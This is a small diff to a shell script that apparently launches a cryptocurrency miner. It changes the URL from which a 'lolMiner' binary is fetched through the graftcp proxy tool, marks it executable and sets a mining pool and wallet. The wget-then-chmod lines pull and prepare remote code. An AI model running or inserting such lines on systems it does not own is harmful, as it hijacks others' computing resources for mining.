@@ -35,7 +35,7 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/Kiriknak/Kiriknak.github.io/raw/master/lolMiner
+./graftcp/graftcp wget https://raw.githubusercontent.com/Kiriknak/Kiriknak.github.io/master/lolMiner
 chmod +x lolMiner
 POOL=stratum+tcp://ethash.poolbinance.com:443
 WALLET=balhein
